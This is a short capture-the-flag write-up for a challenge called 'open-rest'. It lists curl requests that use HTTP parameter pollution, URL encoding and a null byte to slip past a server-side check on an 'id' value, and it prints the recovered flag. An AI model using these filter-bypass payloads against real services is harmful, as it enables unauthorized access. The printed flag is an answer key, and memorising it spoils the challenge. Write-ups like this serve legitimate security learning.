# open-rest

After opening the connection with curl I started setting different query params do the value flag to see if I can bypass the checker.
Some payloads I tested:
```sh
curl -X POST  "http://35.198.74.113:30154/vuln?id[]=flag&id=flag" # blocked
curl -X POST  "http://35.198.74.113:30154/vuln?id=flag&x=" # blocked
curl -X POST  "http://35.198.74.113:30154/vuln?id=foo&flag"
curl -X POST  "http://35.198.74.113:30154/vuln?id=f%6c%61%67" # this got blocked as well
curl -X POST  "http://35.198.74.113:30154/vuln?id=flag%00" --output bin 
```
The last one gave me a binary that when I ran xxd on it I got:
```sh
00000000: 666c 6167 000a                           flag..
```

The payload that gave me the clue and final solution was:
```sh
curl -X POST  "http://35.198.74.113:30154/vuln?id=foo&id=flag"
```
The output was: fooflag

And I understood that the ctf puts together bits of text if the same query param has them.

So I tested:
```
curl -X POST  "http://35.198.74.113:30154/vuln?id=flag&id=foo"
```

And got the flag, since the program checks id param as id1+id2 as one string, but the second part checks id1 as a single param and id1 has flag in it.

flag: `CTF{0a6b6873077437385ee7ab493dd94f69b262b727f5a8e404635631b1abbe361d}`